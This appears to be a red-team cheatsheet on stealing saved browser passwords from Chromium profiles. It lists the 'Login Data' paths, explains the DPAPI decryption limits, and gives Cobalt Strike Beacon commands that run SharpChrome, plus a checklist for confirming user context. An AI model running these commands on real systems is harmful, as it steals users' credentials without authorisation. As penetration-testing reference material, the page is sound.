---
title: "Browser Credentials · SharpChrome"
description: "A reference for Chromium Login Data databases and SharpChrome, including user context, profile locations and decryption limitations."
category: "Credential Dumping"
tools: ["Cobalt Strike", "SharpChrome", "DPAPI"]
updated: 2026-11-10
tags: ["credentials", "browser", "windows", "dpapi"]
draft: false
---

## 1. Storage locations

Browsers can save credentials for applications that require a username and password. Chromium-based browsers store entries in a SQLite database named `Login Data` within each profile.

DPAPI-based protection ties credential recovery to the appropriate user context and key material. The implementation depends on the browser and version: possessing the file does not guarantee that SharpChrome can decrypt its passwords.

| Item | Reference path |
|---|---|
| Generic Chromium profile | `%LOCALAPPDATA%\<vendor>\<browser>\User Data\Default\Login Data` |
| Default Chrome profile | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data` |
| Other profiles | Directories such as `Profile 1` under `User Data` |

`Default` is only one profile. An empty database does not imply that other profiles contain no entries.

## 2. Context and requirements

The example runs at medium integrity as the user whose profile is being analyzed. Access to the files and corresponding decryption material is required. The tool does not guarantee recovery of other users' secrets or compatibility with every Chromium version.

## 3. Querying with SharpChrome

Run from Beacon. The assembly path refers to the operator's machine.

```shell
# Read and attempt to decrypt logins from supported profiles
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome.exe logins
# Review results by profile, URL, username and recovered password
# An existing entry does not guarantee successful decryption
```

## 4. Troubleshooting

| Symptom | What to check |
|---|---|
| No entries | Effective user, profiles and saved passwords |
| File not found | Actual browser and profile path |
| Read failure | Permissions, file locks and the specific error |
| Entries found but no passwords | Encryption compatibility and available DPAPI material |

## 5. Quick checklist

Run the identity and directory checks in Beacon. Adapt paths to the actual browser and profile; the Chrome path below is an example.

```text
IDENTITY AND PROFILE
[ ] getuid → confirm the effective user
[ ] shell whoami /user → record the Windows user and SID
[ ] shell dir "%LOCALAPPDATA%\Google\Chrome\User Data" → locate Default and other profiles
[ ] shell dir "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" → check the example database
[ ] Repeat the path check for the actual browser and profile

SAVED LOGINS
[ ] execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome.exe logins
[ ] Review the profile, URL, username and any recovered password
[ ] Distinguish successful database reading from successful secret decryption
[ ] If no password is returned, check compatibility, user context and the reported error
```


## Related references

- [Windows Credential Manager and DPAPI](/cheatsheets/windows-credential-manager-cheatsheet/)
- [LSASS, SAM, LSA Secrets and cached credentials](/cheatsheets/os-credential-dumping-cheatsheet/)
- [Kerberos: roasting and local tickets](/cheatsheets/kerberos-credential-access-cheatsheet/)
